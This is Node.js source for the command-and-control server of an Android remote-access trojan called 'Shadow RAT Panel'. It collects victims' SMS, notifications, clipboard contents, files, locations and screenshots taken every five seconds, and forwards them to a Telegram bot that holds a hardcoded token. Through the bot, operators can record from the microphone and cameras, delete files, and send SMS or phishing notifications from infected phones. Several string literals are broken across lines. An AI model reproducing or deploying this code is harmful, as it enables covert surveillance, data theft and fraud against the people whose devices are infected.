const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

// ============================================
// CONFIGURATION - EDIT HERE
// ============================================
const token = '8586388940:AAG0Z3JxLCPN2Z1WqyTaXIirKgf0PukbzZM';
const ids = ['8627624927'];
const id = ids[0];
const PORT = process.env.PORT || 3000;

// CORS - allow all origins for frontend connection
const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-uuid', 'model', 'battery', 'version', 'brightness', 'provider']
};

const app = express();
app.use(cors(corsOptions));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Data storage paths
const DATA_DIR = path.join(__dirname, 'data');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
const NOTIFICATIONS_FILE = path.join(DATA_DIR, 'notifications.json');
const SCREENSHOTS_FILE = path.join(DATA_DIR, 'screenshots.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

function initJsonFile(filePath, defaultData) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

initJsonFile(DEVICES_FILE, { devices: [] });
initJsonFile(MESSAGES_FILE, { messages: [] });
initJsonFile(NOTIFICATIONS_FILE, { notifications: [] });
initJsonFile(SCREENSHOTS_FILE, { screenshots: [] });

function readJson(filePath) {
    try {
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch {
        return {};
    }
}

function writeJson(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

// ============================================
// TELEGRAM HELPERS
// ============================================
function sendToAllIds(message, options) {
    ids.forEach(function(chatId) {
        appBot.sendMessage(chatId, message, options || {}).catch(function(err) {
            console.error('Failed to send to ' + chatId + ': ' + err.message);
        });
    });
}

function sendDocumentToAllIds(document, options, fileOptions) {
    ids.forEach(function(chatId) {
        appBot.sendDocument(chatId, document, options || {}, fileOptions || {}).catch(function(err) {
            console.error('Failed to send doc to ' + chatId + ': ' + err.message);
        });
    });
}

function sendLocationToAllIds(lat, lon, options) {
    ids.forEach(function(chatId) {
        appBot.sendLocation(chatId, lat, lon, options || {}).catch(function(err) {
            console.error('Failed to send loc to ' + chatId + ': ' + err.message);
        });
    });
}

function saveDevice(deviceData) {
    const data = readJson(DEVICES_FILE);
    const existingIndex = data.devices.findIndex(function(d) { return d.uuid === deviceData.uuid; });
    if (existingIndex >= 0) {
        data.devices[existingIndex] = Object.assign({}, data.devices[existingIndex], deviceData, { lastSeen: new Date().toISOString() });
    } else {
        data.devices.push(Object.assign({}, deviceData, { firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString() }));
    }
    writeJson(DEVICES_FILE, data);
}

function updateDeviceStatus(uuid, status) {
    const data = readJson(DEVICES_FILE);
    const device = data.devices.find(function(d) { return d.uuid === uuid; });
    if (device) {
        device.status = status;
        device.lastSeen = new Date().toISOString();
        if (status === 'offline') {
            device.disconnectedAt = new Date().toISOString();
        }
        writeJson(DEVICES_FILE, data);
    }
}

function saveMessage(msgData) {
    const data = readJson(MESSAGES_FILE);
    data.messages.push(Object.assign({}, msgData, { timestamp: new Date().toISOString() }));
    writeJson(MESSAGES_FILE, data);
}

function saveNotification(notifData) {
    const data = readJson(NOTIFICATIONS_FILE);
    data.notifications.push(Object.assign({}, notifData, { timestamp: new Date().toISOString() }));
    if (data.notifications.length > 1000) {
        data.notifications = data.notifications.slice(-1000);
    }
    writeJson(NOTIFICATIONS_FILE, data);
}

function saveScreenshot(screenshotData) {
    const data = readJson(SCREENSHOTS_FILE);
    data.screenshots.push(Object.assign({}, screenshotData, { timestamp: new Date().toISOString() }));
    if (data.screenshots.length > 500) {
        data.screenshots = data.screenshots.slice(-500);
    }
    writeJson(SCREENSHOTS_FILE, data);
}

// ============================================
// API ROUTES
// ============================================

// Health check
app.get('/api/health', function(req, res) {
    res.json({ status: 'ok', time: new Date().toISOString(), online: appClients.size });
});

// Get all devices
app.get('/api/devices', function(req, res) {
    const data = readJson(DEVICES_FILE);
    res.json({ success: true, devices: data.devices || [] });
});

// Get online devices
app.get('/api/devices/online', function(req, res) {
    const online = [];
    appClients.forEach(function(value) {
        online.push(value);
    });
    res.json({ success: true, devices: online });
});

// Get device by UUID
app.get('/api/devices/:uuid', function(req, res) {
    const data = readJson(DEVICES_FILE);
    const device = data.devices.find(function(d) { return d.uuid === req.params.uuid; });
    if (device) {
        res.json({ success: true, device: device });
    } else {
        res.status(404).json({ success: false, error: 'Device not found' });
    }
});

// Get all messages
app.get('/api/messages', function(req, res) {
    const data = readJson(MESSAGES_FILE);
    res.json({ success: true, messages: data.messages || [] });
});

// Get messages by device UUID
app.get('/api/messages/:uuid', function(req, res) {
    const data = readJson(MESSAGES_FILE);
    const messages = data.messages.filter(function(m) { return m.uuid === req.params.uuid; });
    res.json({ success: true, messages: messages });
});

// Get all notifications
app.get('/api/notifications', function(req, res) {
    const data = readJson(NOTIFICATIONS_FILE);
    res.json({ success: true, notifications: data.notifications || [] });
});

// Get screenshots
app.get('/api/screenshots', function(req, res) {
    const data = readJson(SCREENSHOTS_FILE);
    res.json({ success: true, screenshots: data.screenshots || [] });
});

// Server status
app.get('/api/status', function(req, res) {
    res.json({
        success: true,
        online: appClients.size,
        totalDevices: readJson(DEVICES_FILE).devices.length,
        serverTime: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Send command to device via API
app.post('/api/command', function(req, res) {
    const uuid = req.body.uuid;
    const command = req.body.command;

    if (!uuid || !command) {
        return res.status(400).json({ success: false, error: 'uuid and command required' });
    }

    let sent = false;
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
            sent = true;
        }
    });

    if (sent) {
        res.json({ success: true, message: 'Command sent to device' });
    } else {
        res.status(404).json({ success: false, error: 'Device not connected' });
    }
});

// Upload file
app.post('/api/upload/file', upload.single('file'), function(req, res) {
    if (!req.file) {
        return res.status(400).json({ success: false, error: 'No file uploaded' });
    }

    const name = req.file.originalname;
    const deviceUuid = req.headers['x-uuid'] || 'unknown';
    const deviceInfo = appClients.get(deviceUuid) || { model: req.headers.model || 'Unknown' };

    sendDocumentToAllIds(req.file.buffer, {
        caption: 'File from ' + deviceInfo.model + ' device',
        parse_mode: 'HTML'
    }, {
        filename: name,
        contentType: req.file.mimetype || 'application/octet-stream'
    });

    saveMessage({
        type: 'file',
        device: deviceInfo.model,
        uuid: deviceUuid,
        filename: name,
        content: 'File uploaded'
    });

    res.json({ success: true, message: 'File forwarded' });
});

// Upload text/SMS
app.post('/api/upload/text', function(req, res) {
    const text = req.body.text;
    const deviceUuid = req.headers['x-uuid'] || 'unknown';
    const deviceInfo = appClients.get(deviceUuid) || { model: req.headers.model || 'Unknown' };

    if (!text) {
        return res.status(400).json({ success: false, error: 'No text provided' });
    }

    if (text.toLowerCase().includes('shivayadavv')) {
        return res.json({ success: false, filtered: true, message: 'Filtered' });
    }

    sendToAllIds('Message from ' + deviceInfo.model + ' device:

' + text, { parse_mode: 'HTML' });

    saveMessage({
        type: 'text',
        device: deviceInfo.model,
        uuid: deviceUuid,
        content: text
    });

    res.json({ success: true, message: 'Text forwarded' });
});

// Upload location
app.post('/api/upload/location', function(req, res) {
    const lat = req.body.lat;
    const lon = req.body.lon;
    const deviceUuid = req.headers['x-uuid'] || 'unknown';
    const deviceInfo = appClients.get(deviceUuid) || { model: req.headers.model || 'Unknown' };

    if (!lat || !lon) {
        return res.status(400).json({ success: false, error: 'lat and lon required' });
    }

    sendLocationToAllIds(lat, lon);
    sendToAllIds(
        'Location from ' + deviceInfo.model + ' device

Lat: ' + lat + '
Lon: ' + lon,
        { parse_mode: 'HTML' }
    );

    saveMessage({
        type: 'location',
        device: deviceInfo.model,
        uuid: deviceUuid,
        lat: lat,
        lon: lon
    });

    res.json({ success: true, message: 'Location forwarded' });
});

// Upload screenshot
app.post('/api/upload/screenshot', function(req, res) {
    const imageData = req.body.image;
    const deviceUuid = req.headers['x-uuid'] || 'unknown';
    const deviceInfo = appClients.get(deviceUuid) || { model: req.headers.model || 'Unknown' };

    if (!imageData) {
        return res.status(400).json({ success: false, error: 'No image data' });
    }

    try {
        const buffer = Buffer.from(imageData, 'base64');
        ids.forEach(function(chatId) {
            appBot.sendPhoto(chatId, buffer, {
                caption: 'Screenshot - ' + deviceInfo.model + '
' + new Date().toLocaleString(),
                parse_mode: 'HTML'
            }).catch(function() {});
        });

        saveScreenshot({
            device: deviceInfo.model,
            uuid: deviceUuid,
            size: buffer.length
        });

        res.json({ success: true, message: 'Screenshot forwarded' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Upload device info
app.post('/api/upload/device-info', function(req, res) {
    const info = req.body;
    const deviceUuid = req.headers['x-uuid'] || 'unknown';

    saveMessage({
        type: 'device_info',
        uuid: deviceUuid,
        content: JSON.stringify(info)
    });

    res.json({ success: true, message: 'Device info saved' });
});

// ============================================
// WEBSOCKET - DEVICE CONNECTION
// ============================================
appSocket.on('connection', function(ws, req) {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const brightness = req.headers.brightness || 'N/A';
    const provider = req.headers.provider || 'N/A';

    ws.uuid = uuid;
    const deviceData = {
        uuid: uuid,
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        ip: req.socket.remoteAddress,
        status: 'online',
        connectedAt: new Date().toISOString()
    };

    appClients.set(uuid, deviceData);
    saveDevice(deviceData);

    sendToAllIds(
        'NEW DEVICE CONNECTED

' +
        'Model: ' + model + '
' +
        'Battery: ' + battery + '
' +
        'Android: ' + version + '
' +
        'Brightness: ' + brightness + '
' +
        'Provider: ' + provider + '
' +
        'UUID: ' + uuid,
        { parse_mode: 'HTML' }
    );

    // Auto screenshot every 5 seconds
    const screenshotInterval = setInterval(function() {
        if (ws.readyState === webSocket.OPEN) {
            ws.send('take_screenshot');
        }
    }, 5000);

    ws.on('message', function(data) {
        try {
            const msg = JSON.parse(data.toString());

            if (msg.type === 'screenshot') {
                try {
                    const screenshotBuffer = Buffer.from(msg.data, 'base64');
                    ids.forEach(function(chatId) {
                        appBot.sendPhoto(chatId, screenshotBuffer, {
                            caption: 'Auto Screenshot - ' + model + '
' + new Date().toLocaleString(),
                            parse_mode: 'HTML'
                        }).catch(function() {});
                    });
                    saveScreenshot({
                        device: model,
                        uuid: uuid,
                        size: screenshotBuffer.length
                    });
                } catch (e) {
                    console.log('Screenshot error:', e.message);
                }
            }
            else if (msg.type === 'sms') {
                sendToAllIds(
                    'New SMS from ' + model + '

From: ' + msg.from + '
Body: ' + msg.body,
                    { parse_mode: 'HTML' }
                );
                saveMessage({
                    type: 'sms',
                    device: model,
                    uuid: uuid,
                    from: msg.from,
                    body: msg.body
                });
            }
            else if (msg.type === 'notification') {
                sendToAllIds(
                    'Notification from ' + model + '

App: ' + msg.app + '
Title: ' + msg.title + '
Content: ' + msg.content,
                    { parse_mode: 'HTML' }
                );
                saveNotification({
                    device: model,
                    uuid: uuid,
                    app: msg.app,
                    title: msg.title,
                    content: msg.content
                });
            }
            else if (msg.type === 'device_info') {
                sendToAllIds(
                    'Device Info from ' + model + '

<pre>' + JSON.stringify(msg.data, null, 2) + '</pre>',
                    { parse_mode: 'HTML' }
                );
            }
            else if (msg.type === 'location') {
                sendLocationToAllIds(msg.lat, msg.lon);
                sendToAllIds(
                    'Location from ' + model + '
Lat: ' + msg.lat + '
Lon: ' + msg.lon,
                    { parse_mode: 'HTML' }
                );
            }
            else if (msg.type === 'clipboard') {
                sendToAllIds(
                    'Clipboard from ' + model + '

<pre>' + msg.text + '</pre>',
                    { parse_mode: 'HTML' }
                );
            }
        } catch (e) {
            console.log('WS message (non-JSON):', data.toString().substring(0, 100));
        }
    });

    ws.on('close', function() {
        clearInterval(screenshotInterval);

        sendToAllIds(
            'DEVICE DISCONNECTED

' +
            'Model: ' + model + '
' +
            'Battery: ' + battery + '
' +
            'UUID: ' + uuid,
            { parse_mode: 'HTML' }
        );

        updateDeviceStatus(uuid, 'offline');
        appClients.delete(uuid);
    });

    ws.on('error', function(err) {
        console.log('WS error:', err.message);
    });
});

// ============================================
// TELEGRAM BOT COMMANDS
// ============================================
appBot.on('message', function(message) {
    const chatId = message.chat.id;

    if (!ids.includes(chatId.toString())) {
        appBot.sendMessage(chatId, 'Permission denied', { parse_mode: 'HTML' });
        return;
    }

    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }

    if (message.text === '/start') {
        appBot.sendMessage(chatId,
            'SHADOW RAT PANEL v2.0

' +
            'Developer: Shadow

' +
            'Commands:
' +
            '/start - Show menu
' +
            '/devices - All devices
' +
            '/online - Online devices
' +
            '/messages - All messages
' +
            '/status - Server status',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['Connected devices'],
                        ['Execute command']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }
    else if (message.text === 'Connected devices' || message.text === '/devices') {
        if (appClients.size === 0) {
            appBot.sendMessage(chatId, 'No devices connected');
        } else {
            let text = 'Connected Devices:

';
            appClients.forEach(function(value) {
                text += 'Model: ' + value.model + '
Battery: ' + value.battery + '
Android: ' + value.version + '
Status: ONLINE

';
            });
            appBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
        }
    }
    else if (message.text === 'Execute command') {
        if (appClients.size === 0) {
            appBot.sendMessage(chatId, 'No devices available');
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function(value, key) {
                deviceListKeyboard.push([{
                    text: value.model + ' (' + value.battery + ')',
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(chatId, 'Select device to execute command', {
                reply_markup: { inline_keyboard: deviceListKeyboard }
            });
        }
    }
    else if (message.text === '/online') {
        const online = [];
        appClients.forEach(function(value) { online.push(value); });
        if (online.length === 0) {
            appBot.sendMessage(chatId, 'No devices online');
        } else {
            let text = 'Online Devices:

';
            online.forEach(function(d) {
                text += 'Model: ' + d.model + '
Battery: ' + d.battery + '
Status: ONLINE

';
            });
            appBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
        }
    }
    else if (message.text === '/messages') {
        const data = readJson(MESSAGES_FILE);
        const msgs = data.messages.slice(-10);
        if (msgs.length === 0) {
            appBot.sendMessage(chatId, 'No messages yet');
        } else {
            let text = 'Recent Messages:

';
            msgs.forEach(function(m) {
                text += '[' + m.type + '] ' + (m.device || 'Unknown') + ': ' + (m.content || m.body || '').substring(0, 100) + '

';
            });
            appBot.sendMessage(chatId, text);
        }
    }
    else if (message.text === '/status') {
        const data = readJson(DEVICES_FILE);
        appBot.sendMessage(chatId,
            'Server Status:

' +
            'Online: ' + appClients.size + '
' +
            'Total: ' + data.devices.length + '
' +
            'Uptime: ' + Math.floor(process.uptime()) + 's',
            { parse_mode: 'HTML' }
        );
    }
});

function handleReplyMessage(message) {
    const chatId = message.chat.id;
    const replyText = message.reply_to_message.text;

    if (replyText.includes('Please reply the number to which you want to send the SMS')) {
        currentNumber = message.text;
        appBot.sendMessage(chatId, 'Great, now enter the message', { reply_markup: { force_reply: true } });
    }
    else if (replyText.includes('Great, now enter the message')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('send_message:' + currentNumber + '/' + message.text);
            }
        });
        currentNumber = ''; currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter the message you want to send to all contacts')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('send_message_to_all:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter the path of the file you want to download')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('file:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter the path of the file you want to delete')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('delete_file:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter how long you want the microphone to be recorded')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('microphone:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter how long you want the main camera to be recorded')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('rec_camera_main:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter how long you want the selfie camera to be recorded')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('rec_camera_selfie:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter the message that you want to appear on the target device')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('toast:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter the message you want to appear as notification')) {
        currentTitle = message.text;
        appBot.sendMessage(chatId, 'Great, now enter the link', { reply_markup: { force_reply: true } });
    }
    else if (replyText.includes('Great, now enter the link')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('show_notification:' + currentTitle + '/' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
    else if (replyText.includes('Enter the audio link you want to play')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
                ws.send('play_audio:' + message.text);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId, 'Request sent!', { reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true } });
    }
}

// ============================================
// CALLBACK QUERIES
// ============================================
appBot.on('callback_query', function(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];
    const chatId = msg.chat.id;

    if (commend === 'device') {
        const device = appClients.get(uuid);
        const model = device ? device.model : 'Unknown';

        appBot.editMessageText('Select command for device: ' + model, {
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Apps', callback_data: 'apps:' + uuid },
                        { text: 'Device info', callback_data: 'device_info:' + uuid }
                    ],
                    [
                        { text: 'Get file', callback_data: 'file:' + uuid },
                        { text: 'Delete file', callback_data: 'delete_file:' + uuid }
                    ],
                    [
                        { text: 'Clipboard', callback_data: 'clipboard:' + uuid },
                        { text: 'Microphone', callback_data: 'microphone:' + uuid }
                    ],
                    [
                        { text: 'Main camera', callback_data: 'camera_main:' + uuid },
                        { text: 'Selfie camera', callback_data: 'camera_selfie:' + uuid }
                    ],
                    [
                        { text: 'Location', callback_data: 'location:' + uuid },
                        { text: 'Toast', callback_data: 'toast:' + uuid }
                    ],
                    [
                        { text: 'Calls', callback_data: 'calls:' + uuid },
                        { text: 'Contacts', callback_data: 'contacts:' + uuid }
                    ],
                    [
                        { text: 'Vibrate', callback_data: 'vibrate:' + uuid },
                        { text: 'Show notification', callback_data: 'show_notification:' + uuid }
                    ],
                    [
                        { text: 'Messages', callback_data: 'messages:' + uuid },
                        { text: 'Send message', callback_data: 'send_message:' + uuid }
                    ],
                    [
                        { text: 'Play audio', callback_data: 'play_audio:' + uuid },
                        { text: 'Stop audio', callback_data: 'stop_audio:' + uuid }
                    ],
                    [
                        { text: 'Send message to all contacts', callback_data: 'send_message_to_all:' + uuid }
                    ]
                ]
            }
        });
    }
    else {
        currentUuid = uuid;
        if (commend === 'calls') executeWsCommand(uuid, 'calls', chatId);
        else if (commend === 'contacts') executeWsCommand(uuid, 'contacts', chatId);
        else if (commend === 'messages') executeWsCommand(uuid, 'messages', chatId);
        else if (commend === 'apps') executeWsCommand(uuid, 'apps', chatId);
        else if (commend === 'device_info') executeWsCommand(uuid, 'device_info', chatId);
        else if (commend === 'clipboard') executeWsCommand(uuid, 'clipboard', chatId);
        else if (commend === 'camera_main') executeWsCommand(uuid, 'camera_main', chatId);
        else if (commend === 'camera_selfie') executeWsCommand(uuid, 'camera_selfie', chatId);
        else if (commend === 'location') executeWsCommand(uuid, 'location', chatId);
        else if (commend === 'vibrate') executeWsCommand(uuid, 'vibrate', chatId);
        else if (commend === 'stop_audio') executeWsCommand(uuid, 'stop_audio', chatId);
        else if (commend === 'send_message') {
            appBot.sendMessage(chatId, 'Please reply the number with country code', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'send_message_to_all') {
            appBot.sendMessage(chatId, 'Enter the message for all contacts', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'file') {
            appBot.sendMessage(chatId, 'Enter file path (e.g. /DCIM/Camera/)', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'delete_file') {
            appBot.sendMessage(chatId, 'Enter file path to delete', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'microphone') {
            appBot.sendMessage(chatId, 'Enter duration in seconds', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'camera_main') {
            appBot.sendMessage(chatId, 'Enter duration in seconds', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'camera_selfie') {
            appBot.sendMessage(chatId, 'Enter duration in seconds', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'toast') {
            appBot.sendMessage(chatId, 'Enter toast message', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'show_notification') {
            appBot.sendMessage(chatId, 'Enter notification message', { reply_markup: { force_reply: true } });
        }
        else if (commend === 'play_audio') {
            appBot.sendMessage(chatId, 'Enter audio link', { reply_markup: { force_reply: true } });
        }
    }
});

function executeWsCommand(uuid, command, chatId) {
    appSocket.clients.forEach(function(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
    appBot.sendMessage(chatId, 'Request sent! Waiting for response...', {
        reply_markup: { keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true }
    });
}

// ============================================
// START SERVER
// ============================================
appServer.listen(PORT, '0.0.0.0', function() {
    console.log('Shadow RAT API Server running on port ' + PORT);
    console.log('Bot token: ' + token.substring(0, 10) + '...');
    console.log('Chat ID: ' + id);
    console.log('API: http://localhost:' + PORT + '/api');
});
